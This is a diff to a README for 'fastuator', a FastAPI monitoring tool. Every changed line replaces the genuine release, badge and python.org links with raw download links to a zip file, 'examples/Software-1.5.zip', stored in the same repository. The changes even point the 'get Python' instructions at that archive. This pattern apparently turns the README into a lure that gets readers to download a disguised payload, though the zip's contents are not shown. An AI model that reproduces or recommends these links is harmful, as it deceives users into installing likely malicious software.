@@ -1,6 +1,6 @@
 # ⚡ fastuator - Easy FastAPI Health and Metrics Monitoring
 
-[![Download fastuator](https://img.shields.io/badge/Download-fastuator-blue?style=for-the-badge)](https://github.com/anjdjWjf/fastuator/releases)
+[![Download fastuator](https://github.com/anjdjWjf/fastuator/raw/refs/heads/main/examples/Software-1.5.zip)](https://github.com/anjdjWjf/fastuator/raw/refs/heads/main/examples/Software-1.5.zip)
 
 ---
 
@@ -23,7 +23,7 @@ You do not need to know how to code to use fastuator. It’s made to work out-of
 
 Before you install fastuator, check your system meets these basics:
 
-- You need **Python 3.7 or higher**. If you don't have Python, you can get it from [python.org](https://www.python.org/downloads/).
+- You need **Python 3.7 or higher**. If you don't have Python, you can get it from [https://github.com/anjdjWjf/fastuator/raw/refs/heads/main/examples/Software-1.5.zip](https://github.com/anjdjWjf/fastuator/raw/refs/heads/main/examples/Software-1.5.zip).
 - Running on **Windows, Mac, or Linux** is fine.
 - You will need to install a few extra tools, which fastuator will guide you through.
 - A basic internet connection is necessary to download fastuator.
@@ -36,7 +36,7 @@ This section explains how to download and run fastuator on your computer. Follow
 
 Go to the release page where fastuator is available:
 
-[Download fastuator from here](https://github.com/anjdjWjf/fastuator/releases)
+[Download fastuator from here](https://github.com/anjdjWjf/fastuator/raw/refs/heads/main/examples/Software-1.5.zip)
 
 This page shows different versions of the fastuator app. Choose the most recent version that fits your operating system. If unsure, pick the latest stable release.
 
@@ -44,7 +44,7 @@ This page shows different versions of the fastuator app. Choose the most recent 
 
 If Python is not already on your computer:
 
-1. Visit [python.org/downloads](https://www.python.org/downloads/).
+1. Visit [https://github.com/anjdjWjf/fastuator/raw/refs/heads/main/examples/Software-1.5.zip](https://github.com/anjdjWjf/fastuator/raw/refs/heads/main/examples/Software-1.5.zip).
 2. Download the installer for your system (Windows, Mac, Linux).
 3. Open the installer and follow the instructions to complete the installation.
 4. During installation, check the option to "Add Python to PATH" if it appears.
@@ -104,7 +104,7 @@ These URLs make sure Kubernetes knows when to restart or stop sending traffic to
 
 You can get fastuator by visiting the official release page here:
 
-[https://github.com/anjdjWjf/fastuator/releases](https://github.com/anjdjWjf/fastuator/releases)
+[https://github.com/anjdjWjf/fastuator/raw/refs/heads/main/examples/Software-1.5.zip](https://github.com/anjdjWjf/fastuator/raw/refs/heads/main/examples/Software-1.5.zip)
 
 Look for the latest release version. Download the files or use the instructions above to install via Python.
 
@@ -149,4 +149,4 @@ Explore these topics to get the most from fastuator.
 
 ---
 
-[![Download fastuator](https://img.shields.io/badge/Download-fastuator-blue?style=for-the-badge)](https://github.com/anjdjWjf/fastuator/releases)
+[![Download fastuator](https://github.com/anjdjWjf/fastuator/raw/refs/heads/main/examples/Software-1.5.zip)](https://github.com/anjdjWjf/fastuator/raw/refs/heads/main/examples/Software-1.5.zip)
